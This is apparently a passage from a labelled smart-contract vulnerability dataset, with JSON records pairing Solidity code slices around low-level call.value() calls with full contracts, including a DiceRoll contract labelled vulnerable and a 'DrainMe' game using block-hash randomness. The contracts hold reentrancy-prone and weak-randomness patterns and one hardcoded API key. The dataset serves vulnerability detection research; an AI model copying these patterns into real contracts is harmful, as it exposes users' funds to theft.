require(isUnlocked(_addresses[j])); balances[_addresses[j]] = balances[_addresses[j]].add(_amount); Transfer(msg.sender, _addresses[j], _amount); } balances[msg.sender] = balances[msg.sender].sub(totalAmount); DistributeTokens(_addresses.length, totalAmount); return true; } function distributeTokens(address[] _addresses, uint256[] _amounts) onlyOwner public isRunning returns (bool) { require(_addresses.length > 0 && _addresses.length == _amounts.length && isUnlocked(msg.sender)); uint256 totalAmount = 0; for(uint j = 0; j < _addresses.length; j++){ require(_amounts[j] > 0 && _addresses[j] != 0x0 && isUnlocked(_addresses[j])); totalAmount = totalAmount.add(_amounts[j]); } require(balances[msg.sender] >= totalAmount); for (j = 0; j < _addresses.length; j++) { balances[_addresses[j]] = balances[_addresses[j]].add(_amounts[j]); Transfer(msg.sender, _addresses[j], _amounts[j]); } balances[msg.sender] = balances[msg.sender].sub(totalAmount); DistributeTokens(_addresses.length, totalAmount); return true; } function upgrade(uint256 _value) external isRunning { require(upgradable); require(upgradeAgent != 0); require(_value != 0); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); totalSupply = totalSupply.sub(_value); totalUpgraded = totalUpgraded.add(_value); UpgradeAgent(upgradeAgent).upgradeFrom(msg.sender, _value); Upgrade(msg.sender, upgradeAgent, _value); } function setUpgradeAgent(address _agent) external { require(_agent != 0); require(!upgradeAgentLocked); require(msg.sender == upgradeMaster); upgradeAgent = _agent; upgradeAgentLocked = true; } function setUpgradeMaster(address _master) external { require(_master != 0); require(msg.sender == upgradeMaster); upgradeMaster = _master; } } "}
{"sol name": "16057.sol", "label": 0, "first path": "function callFirstTarget () public payable onlyPlayers { require (msg.value >= 0.005 ether); firstTarget.call.value(msg.value)(); function callSecondTarget () public payable onlyPlayers { require (msg.value >= 0.005 ether); secondTarget.call.value(msg.value)(); function winPrize() public payable onlyOwner { owner.call.value(1 wei)(); ", "second path": "function callFirstTarget () public payable onlyPlayers { require (msg.value >= 0.005 ether); firstTarget.call.value(msg.value)(); function callSecondTarget () public payable onlyPlayers { require (msg.value >= 0.005 ether); secondTarget.call.value(msg.value)(); function winPrize() public payable onlyOwner { owner.call.value(1 wei)(); ", "third path": "function callFirstTarget () public payable onlyPlayers { require (msg.value >= 0.005 ether); firstTarget.call.value(msg.value)(); function callSecondTarget () public payable onlyPlayers { require (msg.value >= 0.005 ether); secondTarget.call.value(msg.value)(); function winPrize() public payable onlyOwner { owner.call.value(1 wei)(); ", "long path": "pragma solidity ^0.4.23; contract DrainMe { address public winner = 0x0; address public owner; address public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b; address public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766; address[] public players; mapping(address=>bool) approvedPlayers; uint256 public secret; uint256[] public seed = [951828771,158769871220]; uint256[] public balance; function DranMe() public payable{ owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } modifier onlyWinner() { require(msg.sender == winner); _; } modifier onlyPlayers() { require(approvedPlayers[msg.sender]); _; } function getLength() public constant returns(uint256) { return seed.length; } function setSecret(uint256 _secret) public payable onlyOwner{ secret = _secret; } function getPlayerCount() public constant returns(uint256) { return players.length; } function getPrize() public constant returns(uint256) { return address(this).balance; } function becomePlayer() public payable{ require(msg.value >= 0.02 ether); players.push(msg.sender); approvedPlayers[msg.sender]=true; } function manipulateSecret() public payable onlyPlayers{ require (msg.value >= 0.01 ether); if(msg.sender!=owner || unlockSecret()){ uint256 amount = 0; msg.sender.transfer(amount); } } function unlockSecret() private returns(bool){ bytes32 hash = keccak256(blockhash(block.number-1)); uint256 secret = uint256(hash); if(secret%5==0){ winner = msg.sender; return true; } else{ return false; } } function callFirstTarget () public payable onlyPlayers { require (msg.value >= 0.005 ether); firstTarget.call.value(msg.value)(); } function callSecondTarget () public payable onlyPlayers { require (msg.value >= 0.005 ether); secondTarget.call.value(msg.value)(); } function setSeed (uint256 _index, uint256 _value) public payable onlyPlayers { seed[_index] = _value; } function addSeed (uint256 _add) public payable onlyPlayers { seed.length = _add; } function guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) { return (_seed / (seed[0]*seed[1])); if((_seed / (seed[0]*seed[1])) == secret) { owner = winner; } } function checkSecret () public payable onlyPlayers returns(bool) { require(msg.value >= 0.01 ether); if(msg.value == secret){ return true; } } function winPrize() public payable onlyOwner { owner.call.value(1 wei)(); } function claimPrize() public payable onlyWinner { winner.transfer(address(this).balance); } function() public payable{ } } "}
{"sol name": "19402.sol", "label": 0, "first path": "function buyToken(address recipient, uint256 value) internal { if (block.number<startBlock || block.number>endBlock) throw; uint tokens = safeMul(value, price()); if(safeAdd(crowdSaleSoldAmount, tokens)>crowdSaleCap) throw; balances[recipient] = safeAdd(balances[recipient], tokens); crowdSaleSoldAmount = safeAdd(crowdSaleSoldAmount, tokens); totalSupply = safeAdd(totalSupply, tokens); Transfer(address(0), recipient, tokens); if (!founder.call.value(value)()) throw; Buy(recipient, value, tokens); function price() constant returns(uint) { if (block.number<startBlock || block.number > endBlock) return 0; else  return crowdSalePrice; function() public payable { if(msg.value == 0) { sendCandy(msg.sender); }  else { buyToken(msg.sender, msg.value); ", "second path": "function buyToken(address recipient, uint256 value) internal { if (block.number<startBlock || block.number>endBlock) throw; uint tokens = safeMul(value, price()); if(safeAdd(crowdSaleSoldAmount, tokens)>crowdSaleCap) throw; balances[recipient] = safeAdd(balances[recipient], tokens); crowdSaleSoldAmount = safeAdd(crowdSaleSoldAmount, tokens); totalSupply = safeAdd(totalSupply, tokens); Transfer(address(0), recipient, tokens); if (!founder.call.value(value)()) throw; Buy(recipient, value, tokens); function price() constant returns(uint) { if (block.number<startBlock || block.number > endBlock) return 0; else  return crowdSalePrice; function() public payable { if(msg.value == 0) { sendCandy(msg.sender); }  else { buyToken(msg.sender, msg.value); ", "third path": "function buyToken(address recipient, uint256 value) internal { if (block.number<startBlock || block.number>endBlock) throw; uint tokens = safeMul(value, price()); if(safeAdd(crowdSaleSoldAmount, tokens)>crowdSaleCap) throw; balances[recipient] = safeAdd(balances[recipient], tokens); crowdSaleSoldAmount = safeAdd(crowdSaleSoldAmount, tokens); totalSupply = safeAdd(totalSupply, tokens); Transfer(address(0), recipient, tokens); if (!founder.call.value(value)()) throw; Buy(recipient, value, tokens); function price() constant returns(uint) { if (block.number<startBlock || block.number > endBlock) return 0; else  return crowdSalePrice; function() public payable { if(msg.value == 0) { sendCandy(msg.sender); }  else { buyToken(msg.sender, msg.value); ", "long path": "pragma solidity ^0.4.18; contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; assert(a == 0 || c / a == b); return c; } function safeSub(uint a, uint b) internal returns (uint) { assert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; assert(c>=a && c>=b); return c; } function assert(bool assertion) internal { if (!assertion) throw; } } contract Token { function totalSupply() constant returns (uint256 supply) {} function balanceOf(address _owner) constant returns (uint256 balance) {} function transfer(address _to, uint256 _value) returns (bool success) {} function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {} function approve(address _spender, uint256 _value) returns (bool success) {} function allowance(address _owner, address _spender) constant returns (uint256 remaining) {} event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract StandardToken is Token { function transfer(address _to, uint256 _value) returns (bool success) { if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } mapping(address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; uint256 public totalSupply; } contract monechainToken is StandardToken, SafeMath { string public name = \"monechain token\"; string public symbol = \"MONE\"; uint public decimals = 18; uint crowdSalePrice = 300000; uint totalPeriod = 256 * 24 * 365; uint public startBlock = 5278735; uint public endBlock = startBlock + totalPeriod; address public founder = 0x466ea8E1003273AE4471c903fBA7D8edF834970a; uint256 bountyAllocation =    4500000000 * 10**(decimals); uint256 public crowdSaleCap = 1000000000 * 10**(decimals); uint256 public candyCap =     4500000000 * 10**(decimals); uint256 public candyPrice =   1000; uint256 public crowdSaleSoldAmount = 0; uint256 public candySentAmount = 0; mapping(address => bool) candyBook; event Buy(address indexed sender, uint eth, uint fbt); function monechainToken() { balances[founder] = bountyAllocation; totalSupply = bountyAllocation; Transfer(address(0), founder, bountyAllocation); } function price() constant returns(uint) { if (block.number<startBlock || block.number > endBlock) return 0; else  return crowdSalePrice; } function() public payable { if(msg.value == 0) { sendCandy(msg.sender); }  else { buyToken(msg.sender, msg.value); } } function sendCandy(address recipient) internal { if (candyBook[recipient] || candySentAmount>=candyCap) revert(); else { uint candies = candyPrice * 10**(decimals); candyBook[recipient] = true; balances[recipient] = safeAdd(balances[recipient], candies); candySentAmount = safeAdd(candySentAmount, candies); totalSupply = safeAdd(totalSupply, candies); Transfer(address(0), recipient, candies); } } function buyToken(address recipient, uint256 value) internal { if (block.number<startBlock || block.number>endBlock) throw; uint tokens = safeMul(value, price()); if(safeAdd(crowdSaleSoldAmount, tokens)>crowdSaleCap) throw; balances[recipient] = safeAdd(balances[recipient], tokens); crowdSaleSoldAmount = safeAdd(crowdSaleSoldAmount, tokens); totalSupply = safeAdd(totalSupply, tokens); Transfer(address(0), recipient, tokens); if (!founder.call.value(value)()) throw; Buy(recipient, value, tokens); } function checkCandy(address recipient) constant returns (uint256 remaining) { if(candyBook[recipient]) return 0; else return candyPrice; } function changeFounder(address newFounder) { if (msg.sender!=founder) throw; founder = newFounder; } } "}
{"sol name": "3054.sol", "label": 1, "first path": "function player_withdrawPendingTransactions() public returns (bool){ uint withdrawAmount = playerPendingWithdrawals[msg.sender]; playerPendingWithdrawals[msg.sender] = 0; if (msg.sender.call.value(withdrawAmount)()) { return true; } else { playerPendingWithdrawals[msg.sender] = withdrawAmount; return false; ", "second path": "function player_withdrawPendingTransactions() public returns (bool){ uint withdrawAmount = playerPendingWithdrawals[msg.sender]; playerPendingWithdrawals[msg.sender] = 0; if (msg.sender.call.value(withdrawAmount)()) { return true; } else { playerPendingWithdrawals[msg.sender] = withdrawAmount; return false; ", "third path": "function player_withdrawPendingTransactions() public returns (bool){ uint withdrawAmount = playerPendingWithdrawals[msg.sender]; playerPendingWithdrawals[msg.sender] = 0; if (msg.sender.call.value(withdrawAmount)()) { return true; } else { playerPendingWithdrawals[msg.sender] = withdrawAmount; return false; ", "long path": "pragma solidity ^0.4.16; interface dAppBridge_I { function getOwner() external returns(address); function getMinReward(string requestType) external returns(uint256); function getMinGas() external returns(uint256); function callURL(string callback_method, string external_url, string external_params, string json_extract_element) external payable returns(bytes32); } contract DappBridgeLocator_I { function currentLocation() public returns(address); } contract clientOfdAppBridge { address internal _dAppBridgeLocator_Prod_addr = 0x5b63e582645227F1773bcFaE790Ea603dB948c6A; DappBridgeLocator_I internal dAppBridgeLocator; dAppBridge_I internal dAppBridge; uint256 internal current_gas = 0; uint256 internal user_callback_gas = 0; function initBridge() internal { if(address(dAppBridgeLocator) != _dAppBridgeLocator_Prod_addr){ dAppBridgeLocator = DappBridgeLocator_I(_dAppBridgeLocator_Prod_addr); } if(address(dAppBridge) != dAppBridgeLocator.currentLocation()){ dAppBridge = dAppBridge_I(dAppBridgeLocator.currentLocation()); } if(current_gas == 0) { current_gas = dAppBridge.getMinGas(); } } modifier dAppBridgeClient { initBridge(); _; } event event_senderAddress( address senderAddress ); event evnt_dAdppBridge_location( address theLocation ); event only_dAppBridgeCheck( address senderAddress, address checkAddress ); modifier only_dAppBridge_ { initBridge(); emit only_dAppBridgeCheck(msg.sender, address(dAppBridge)); require(msg.sender == address(dAppBridge)); _; } modifier only_dAppBridge { initBridge(); address _dAppBridgeOwner = dAppBridge.getOwner(); require(msg.sender == _dAppBridgeOwner); _; } function setGas(uint256 new_gas) internal { require(new_gas > 0); current_gas = new_gas; } function setCallbackGas(uint256 new_callback_gas) internal { require(new_callback_gas > 0); user_callback_gas = new_callback_gas; } function callURL(string callback_method, string external_url, string external_params) internal dAppBridgeClient returns(bytes32) { uint256 _reward = dAppBridge.getMinReward('callURL')+user_callback_gas; return dAppBridge.callURL.value(_reward).gas(current_gas)(callback_method, external_url, external_params, \"\"); } function callURL(string callback_method, string external_url, string external_params, string json_extract_elemen) internal dAppBridgeClient returns(bytes32) { uint256 _reward = dAppBridge.getMinReward('callURL')+user_callback_gas; return dAppBridge.callURL.value(_reward).gas(current_gas)(callback_method, external_url, external_params, json_extract_elemen); } function stringToBytes32(string memory source) internal pure returns (bytes32 result) { bytes memory tempEmptyStringTest = bytes(source); if (tempEmptyStringTest.length == 0) { return 0x0; } assembly { result := mload(add(source, 32)) } } function char(byte b) internal pure returns (byte c) { if (b < 10) return byte(uint8(b) + 0x30); else return byte(uint8(b) + 0x57); } function bytes32string(bytes32 b32) internal pure returns (string out) { bytes memory s = new bytes(64); for (uint8 i = 0; i < 32; i++) { byte b = byte(b32[i]); byte hi = byte(uint8(b) / 16); byte lo = byte(uint8(b) - 16 * uint8(hi)); s[i*2] = char(hi); s[i*2+1] = char(lo); } out = string(s); } function compareStrings (string a, string b) internal pure returns (bool){ return keccak256(a) == keccak256(b); } function concatStrings(string _a, string _b) internal pure returns (string){ bytes memory bytes_a = bytes(_a); bytes memory bytes_b = bytes(_b); string memory length_ab = new string(bytes_a.length + bytes_b.length); bytes memory bytes_c = bytes(length_ab); uint k = 0; for (uint i = 0; i < bytes_a.length; i++) bytes_c[k++] = bytes_a[i]; for (i = 0; i < bytes_b.length; i++) bytes_c[k++] = bytes_b[i]; return string(bytes_c); } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract DiceRoll is clientOfdAppBridge { using SafeMath for uint256; string public randomAPI_url; string internal randomAPI_key; string internal randomAPI_extract; struct playerDiceRoll { bytes32     betID; address     playerAddr; uint256     rollUnder; uint256     stake; uint256     profit; uint256     win; bool        paid; uint256     result; uint256     timestamp; } mapping (bytes32 => playerDiceRoll) public playerRolls; mapping (address => uint256) playerPendingWithdrawals; address public owner; uint256 public contractBalance; bool public game_paused; uint256 minRoll; uint256 maxRoll; uint256 minBet; uint256 maxBet; uint256 public minRollUnder; uint256 public houseEdge; uint256 public totalUserProfit; uint256 public totalWins; uint256 public totalLosses; uint256 public totalWinAmount; uint256 public totalLossAmount; uint256 public totalFails; uint256 internal totalProfit; uint256 public maxMultiRolls; uint256 public gameNumber; uint256 public oracleFee; mapping(uint256 => bool) public permittedRolls; uint public maxPendingPayouts; function private_getGameState() public view returns(uint256 _contractBalance, bool _game_paused, uint256 _minRoll, uint256 _maxRoll, uint256 _minBet, uint256 _maxBet, uint256 _houseEdge, uint256 _totalUserProfit, uint256 _totalWins, uint256 _totalLosses, uint256 _totalWinAmount, uint256 _totalLossAmount, uint256 _liveMaxBet, uint256 _totalFails) { _contractBalance = contractBalance; _game_paused = game_paused; _minRoll = minRoll; _maxRoll = maxRoll; _minBet = minBet; _maxBet = maxBet; _houseEdge = houseEdge; _totalUserProfit = totalUserProfit; _totalWins = totalWins; _totalLosses = totalLosses; _totalWinAmount = totalWinAmount; _totalLossAmount = totalLossAmount; _liveMaxBet = getLiveMaxBet(); _totalFails = totalFails; } modifier onlyOwner() { require (msg.sender == owner); _; } modifier gameActive() { require (game_paused == false); _; } modifier validBet(uint256 betSize, uint256 rollUnder) { require(rollUnder > minRoll); require(rollUnder < maxRoll); require(betSize <= maxBet); require(betSize >= minBet); require(permittedRolls[rollUnder] == true); uint256 potential_profit = (msg.value * (houseEdge / rollUnder)) - msg.value; require(maxPendingPayouts.add(potential_profit) <= address(this).balance); _; } modifier validBetMulti(uint256 betSize, uint256 rollUnder, uint256 number_of_rolls) { require(rollUnder > minRoll); require(rollUnder < maxRoll); require(betSize <= maxBet); require(betSize >= minBet); require(number_of_rolls <= maxMultiRolls); require(permittedRolls[rollUnder] == true); uint256 potential_profit = (msg.value * (houseEdge / rollUnder)) - msg.value; require(maxPendingPayouts.add(potential_profit) <= address(this).balance); _; } function getLiveMaxBet() public view returns(uint256) { uint256 currentAvailBankRoll = address(this).balance.sub(maxPendingPayouts); uint256 divisor = houseEdge.div(minRollUnder); uint256 liveMaxBet = currentAvailBankRoll.div(divisor); if(liveMaxBet > maxBet) liveMaxBet = maxBet; return liveMaxBet; } function getBet(bytes32 _betID) public view returns(bytes32 betID, address     playerAddr, uint256     rollUnder, uint256     stake, uint256     profit, uint256     win, bool        paid, uint256     result, uint256     timestamp){ playerDiceRoll memory _playerDiceRoll = playerRolls[_betID]; betID = _betID; playerAddr = _playerDiceRoll.playerAddr; rollUnder = _playerDiceRoll.rollUnder; stake = _playerDiceRoll.stake; profit = _playerDiceRoll.profit; win = _playerDiceRoll.win; paid = _playerDiceRoll.paid; result = _playerDiceRoll.result; timestamp = _playerDiceRoll.timestamp; } function getOwner() external view returns(address){ return owner; } function getBalance() external view returns(uint256){ address myAddress = this; return myAddress.balance; } constructor() public payable { owner = msg.sender; houseEdge = 96; contractBalance = msg.value; totalUserProfit = 0; totalWins = 0; totalLosses = 0; minRoll = 1; maxRoll = 100; minBet = 15000000000000000; maxBet = 300000000000000000; randomAPI_url = \"https://api.random.org/json-rpc/1/invoke\"; randomAPI_key = \"7d4ab655-e778-4d9f-815a-98fd518908bd\"; randomAPI_extract = \"result.random.data\"; permittedRolls[20] = true; permittedRolls[30] = true; permittedRolls[40] = true; permittedRolls[50] = true; permittedRolls[60] = true; minRollUnder = 20; totalProfit = 0; totalWinAmount = 0; totalLossAmount = 0; totalFails = 0; maxMultiRolls = 5; gameNumber = 0; oracleFee = 80000000000000; } event DiceRollResult_failedSend( bytes32 indexed betID, address indexed playerAddress, uint256 rollUnder, uint256 result, uint256 amountToSend ); event DiceRollResult( bytes32 indexed betID, address indexed playerAddress, uint256 rollUnder, uint256 result, uint256 stake, uint256 profit, uint256 win, bool paid, uint256 timestamp); function callback(bytes32 key, string callbackData) external payable only_dAppBridge { require(playerRolls[key].playerAddr != address(0x0)); require(playerRolls[key].win == 2); playerRolls[key].result = parseInt(callbackData); uint256 _totalWin = playerRolls[key].stake.add(playerRolls[key].profit); if(maxPendingPayouts < playerRolls[key].profit){ playerRolls[key].result == 0; } else { maxPendingPayouts = maxPendingPayouts.sub(playerRolls[key].profit); } if(playerRolls[key].result == 0){ totalFails = totalFails.add(1); if(!playerRolls[key].playerAddr.send(playerRolls[key].stake)){ emit DiceRollResult(key, playerRolls[key].playerAddr, playerRolls[key].rollUnder, playerRolls[key].result, playerRolls[key].stake, 0, 0, false, now); emit DiceRollResult_failedSend( key, playerRolls[key].playerAddr, playerRolls[key].rollUnder, playerRolls[key].result, playerRolls[key].stake ); playerPendingWithdrawals[playerRolls[key].playerAddr] = playerPendingWithdrawals[playerRolls[key].playerAddr].add(playerRolls[key].stake); delete playerRolls[key]; } else { emit DiceRollResult(key, playerRolls[key].playerAddr, playerRolls[key].rollUnder, playerRolls[key].result, playerRolls[key].stake, 0, 0, true, now); delete playerRolls[key]; } return; } else { if(playerRolls[key].result < playerRolls[key].rollUnder) { contractBalance = contractBalance.sub(playerRolls[key].profit.add(oracleFee)); totalUserProfit = totalUserProfit.add(_totalWin); totalWins = totalWins.add(1); totalWinAmount = totalWinAmount.add(playerRolls[key].profit); uint256 _player_profit_1percent = playerRolls[key].profit.div(houseEdge); uint256 _our_cut = _player_profit_1percent.mul(100-houseEdge); totalProfit = totalProfit.add(_our_cut); if(!playerRolls[key].playerAddr.send(_totalWin)){ emit DiceRollResult(key, playerRolls[key].playerAddr, playerRolls[key].rollUnder, playerRolls[key].result, playerRolls[key].stake, playerRolls[key].profit, 1, false, now); emit DiceRollResult_failedSend( key, playerRolls[key].playerAddr, playerRolls[key].rollUnder, playerRolls[key].result, _totalWin ); playerPendingWithdrawals[playerRolls[key].playerAddr] = playerPendingWithdrawals[playerRolls[key].playerAddr].add(_totalWin); delete playerRolls[key]; } else { emit DiceRollResult(key, playerRolls[key].playerAddr, playerRolls[key].rollUnder, playerRolls[key].result, playerRolls[key].stake, playerRolls[key].profit, 1, true, now); delete playerRolls[key]; } return; } else { totalLosses = totalLosses.add(1); totalLossAmount = totalLossAmount.add(playerRolls[key].stake); contractBalance = contractBalance.add(playerRolls[key].stake.sub(oracleFee)); emit DiceRollResult(key, playerRolls[key].playerAddr, playerRolls[key].rollUnder, playerRolls[key].result, playerRolls[key].stake, playerRolls[key].profit, 0, true, now); delete playerRolls[key]; return; } } } function rollDice(uint rollUnder) public payable gameActive validBet(msg.value, rollUnder) returns (bytes32) { bytes32 betID = callURL(\"callback\", randomAPI_url, constructAPIParam(), randomAPI_extract); gameNumber = gameNumber.add(1); uint256 _fullTotal = (msg.value * getBetDivisor(rollUnder)   ); _fullTotal = _fullTotal.div(100); _fullTotal = _fullTotal.sub(msg.value); uint256 _fullTotal_1percent = _fullTotal.div(100); uint256 _player_profit = _fullTotal_1percent.mul(houseEdge); playerRolls[betID] = playerDiceRoll(betID, msg.sender, rollUnder, msg.value, _player_profit, 2, false, 0, now); maxPendingPayouts = maxPendingPayouts.add(_player_profit); emit DiceRollResult(betID, msg.sender, rollUnder, 0, msg.value, _player_profit, 2, false, now); return betID; } function rollDice(uint rollUnder, uint number_of_rolls) public payable gameActive validBetMulti(msg.value, rollUnder, number_of_rolls) returns (bytes32) { uint c = 0; for(c; c< number_of_rolls; c++) { rollDice(rollUnder); } } function getBetDivisor(uint256 rollUnder) public pure returns (uint256) { if(rollUnder==5) return 20 * 100; if(rollUnder==10) return 10 * 100; if(rollUnder==20) return 5 * 100; if(rollUnder==30) return 3.3 * 100; if(rollUnder==40) return 2.5 * 100; if(rollUnder==50) return 2 * 100; if(rollUnder==60) return 1.66 * 100; if(rollUnder==70) return 1.42 * 100; if(rollUnder==80) return 1.25 * 100; if(rollUnder==90) return 1.11 * 100; return (100/rollUnder) * 10; } function constructAPIParam() internal view returns(string){ return strConcat( strConcat(\"{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"method\\\":\\\"generateIntegers\\\",\\\"params\\\":{\\\"apiKey\\\":\\\"\", randomAPI_key, \"\\\",\\\"n\\\":1,\\\"min\\\":\", uint2str(minRoll), \",\\\"max\\\":\", uint2str(maxRoll), \",\\\"replacement\\\":true,\\\"base\\\":10},\\\"id\\\":\"), uint2str(gameNumber), \"}\" ); } function player_withdrawPendingTransactions() public returns (bool){ uint withdrawAmount = playerPendingWithdrawals[msg.sender]; playerPendingWithdrawals[msg.sender] = 0; if (msg.sender.call.value(withdrawAmount)()) { return true; } else { playerPendingWithdrawals[msg.sender] = withdrawAmount; return false; } } function player_getPendingTxByAddress(address addressToCheck) public constant returns (uint256) { return playerPendingWithdrawals[addressToCheck]; } function private_addPermittedRoll(uint256 _rollUnder) public onlyOwner { permittedRolls[_rollUnder] = true; } function private_delPermittedRoll(uint256 _rollUnder) public onlyOwner { delete permittedRolls[_rollUnder]; } function private_setRandomAPIURL(string newRandomAPI_url) public onlyOwner { randomAPI_url = newRandomAPI_url; } function private_setRandomAPIKey(string newRandomAPI_key) public onlyOwner { randomAPI_key = newRandomAPI_key; } function private_setRandomAPI_extract(string newRandomAPI_extract) public onlyOwner { randomAPI_extract = newRandomAPI_extract; } function private_setminRoll(uint256 newMinRoll) public onlyOwner { require(newMinRoll>0); require(newMinRoll<maxRoll); minRoll = newMinRoll; } function private_setmaxRoll(uint256 newMaxRoll) public onlyOwner { require(newMaxRoll>0); require(newMaxRoll>minRoll); maxRoll = newMaxRoll; } function private_setminBet(uint256 newMinBet) public onlyOwner { require(newMinBet > 0); require(newMinBet < maxBet); minBet = newMinBet; } function private_setmaxBet(uint256 newMaxBet) public onlyOwner { require(newMaxBet > 0); require(newMaxBet > minBet); maxBet = newMaxBet; } function private_setPauseState(bool newState) public onlyOwner { game_paused = newState; } function private_setHouseEdge(uint256 newHouseEdge) public onlyOwner { houseEdge = newHouseEdge; } function private_kill() public onlyOwner { selfdestruct(owner); } function private_withdrawAll(address send_to) external onlyOwner returns(bool) { address myAddress = this; return send_to.send(myAddress.balance); } function private_withdraw(uint256 amount, address send_to) external onlyOwner returns(bool) { address myAddress = this; require(amount <= myAddress.balance); require(amount >0); return send_to.send(amount); } function private_profits() public view onlyOwner returns(uint256) { return totalProfit; } function private_setMinRollUnder(uint256 _minRollUnder) public onlyOwner { minRollUnder = _minRollUnder; } function private_setMaxMultiRolls(uint256 _maxMultiRolls) public onlyOwner { maxMultiRolls = _maxMultiRolls; } function private_setOracleFee(uint256 _oracleFee) public onlyOwner { oracleFee = _oracleFee; } function deposit() public payable onlyOwner { contractBalance = contractBalance.add(msg.value); } function parseInt(string _a) internal pure returns (uint256) { return parseInt(_a, 0); } function parseInt(string _a, uint _b) internal pure returns (uint256) { bytes memory bresult = bytes(_a); uint256 mint = 0; bool decimals = false; for (uint256 i=0; i<bresult.length; i++){ if ((bresult[i] >= 48)&&(bresult[i] <= 57)){ if (decimals){ if (_b == 0) break; else _b--; } mint *= 10; mint += uint256(bresult[i]) - 48; } else if (bresult[i] == 46) decimals = true; } if (_b > 0) mint *= 10**_b; return mint; } function strConcat(string _a, string _b, string _c, string _d, string _e, string _f, string _g) internal pure returns (string) { string memory abcdef = strConcat(_a,_b,_c,_d,_e,_f); return strConcat(abcdef, _g); } function strConcat(string _a, string _b, string _c, string _d, string _e, string _f) internal pure returns (string) { bytes memory _ba = bytes(_a); bytes memory _bb = bytes(_b); bytes memory _bc = bytes(_c); string memory abc = new string(_ba.length + _bb.length + _bc.length); bytes memory babc = bytes(abc); uint256 k = 0; for (uint256 i = 0; i < _ba.length; i++) babc[k++] = _ba[i]; for (i = 0; i < _bb.length; i++) babc[k++] = _bb[i]; for (i = 0; i < _bc.length; i++) babc[k++] = _bc[i]; return strConcat(string(babc), strConcat(_d, _e, _f)); } function strConcat(string _a, string _b, string _c, string _d, string _e) internal pure returns (string) { bytes memory _ba = bytes(_a); bytes memory _bb = bytes(_b); bytes memory _bc = bytes(_c); bytes memory _bd = bytes(_d); bytes memory _be = bytes(_e); string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length); bytes memory babcde = bytes(abcde); uint k = 0; for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i]; for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i]; for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i]; for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i]; for (i = 0; i < _be.length; i++) babcde[k++] = _be[i]; return string(babcde); } function strConcat(string _a, string _b, string _c, string _d) internal pure returns (string) { return strConcat(_a, _b, _c, _d, \"\"); } function strConcat(string _a, string _b, string _c) internal pure returns (string) { return strConcat(_a, _b, _c, \"\", \"\"); } function strConcat(string _a, string _b) internal pure returns (string) { return strConcat(_a, _b, \"\", \"\", \"\"); } function uint2str(uint i) internal pure returns (string){ if (i == 0) return \"0\"; uint j = i; uint len; while (j != 0){ len++; j /= 10; } bytes memory bstr = new bytes(len); uint k = len - 1; while (i != 0){ bstr[k--] = byte(48 + i % 10); i /= 10; } return string(bstr); } } "}
{"sol name": "29517.sol", "label": 0, "first path": "function temporaryEscapeHatch(address to, uint256 value, bytes data) public { require(msg.sender == admin); require(to.call.value(value)(data)); ", "second path": "function temporaryEscapeHatch(address to, uint256 value, bytes data) public { require(msg.sender == admin); require(to.call.value(value)(data)); ", "third path": "function temporaryEscapeHatch(address to, uint256 value, bytes data) public { require(msg.sender == admin); require(to.call.value(value)(data)); ", "long path": "interface ERC20 { function balanceOf(address _owner) public constant returns (uint256 balance); function transfer(address _to, uint256 _value) public returns (bool success); } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { if (a == 0) { return 0; } uint256 c = a * b; require(c / a == b); return c; } } contract Distribution { using SafeMath for uint256; enum State { AwaitingTokens, DistributingNormally, DistributingProRata, Done } address admin; ERC20 tokenContract; State state; uint256 actualTotalTokens; uint256 tokensTransferred; bytes32[] contributionHashes; uint256 expectedTotalTokens; function Distribution(address _admin, ERC20 _tokenContract, bytes32[] _contributionHashes, uint256 _expectedTotalTokens) public { expectedTotalTokens = _expectedTotalTokens; contributionHashes = _contributionHashes; tokenContract = _tokenContract; admin = _admin; state = State.AwaitingTokens; } function handleTokensReceived() public { require(state == State.AwaitingTokens); uint256 totalTokens = tokenContract.balanceOf(this); require(totalTokens > 0); tokensTransferred = 0; if (totalTokens == expectedTotalTokens) { state = State.DistributingNormally; } else { actualTotalTokens = totalTokens; state = State.DistributingProRata; } } function _numTokensForContributor(uint256 contributorExpectedTokens, uint256 _tokensTransferred, State _state) internal view returns (uint256) { if (_state == State.DistributingNormally) { return contributorExpectedTokens; } else if (_state == State.DistributingProRata) { uint256 tokens = actualTotalTokens.mul(contributorExpectedTokens) / expectedTotalTokens; uint256 tokensRemaining = actualTotalTokens - _tokensTransferred; if (tokens < tokensRemaining) { return tokens; } 